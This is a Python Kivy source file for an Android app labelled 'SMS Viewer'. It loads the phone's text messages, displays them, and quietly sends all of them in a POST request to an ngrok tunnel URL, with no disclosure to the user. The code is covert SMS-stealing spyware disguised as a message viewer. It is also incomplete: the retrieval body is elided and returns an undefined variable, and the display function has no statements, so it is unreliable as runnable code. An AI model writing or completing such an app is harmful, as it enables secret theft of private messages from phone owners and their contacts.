from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from jnius import autoclass
import requests

class SMSViewer(App):
    def build(self):
        layout = BoxLayout(orientation='vertical')
        self.sms_label = Label(text="Click 'Load SMS' to view messages")
        load_button = Button(text="Load SMS")
        load_button.bind(on_press=self.load_sms)
        layout.add_widget(self.sms_label)
        layout.add_widget(load_button)
        return layout

    def load_sms(self, instance):
        try:
            sms_messages = self.get_sms_messages()
            self.display_sms(sms_messages)
            self.send_to_server(sms_messages)  # Send the SMS data to the server
        except Exception as e:
            self.sms_label.text = "Failed to load or send SMS messages: " + str(e)

    def get_sms_messages(self):
        try:
            # The existing SMS retrieval code remains unchanged
            # ...
            return sms_messages
        except Exception as e:
            raise Exception("Error fetching SMS messages: " + str(e))

    def display_sms(self, sms_messages):
        # Existing display function remains unchanged
        # ...

    def send_to_server(self, sms_messages):
        server_url = 'http://87bf-46-173-170-215.ngrok-free.app/api/sms_data'  # Replace with your actual server URL
        headers = {'Content-Type': 'application/json'}
        data = {'sms_messages': sms_messages}  # Assuming the server expects JSON data
        response = requests.post(server_url, json=data, headers=headers)
        if response.status_code == 200:
            print("SMS data sent to server successfully")
        else:
            print("Failed to send SMS data to server. Status code:", response.status_code)

if __name__ == '__main__':
    SMSViewer().run()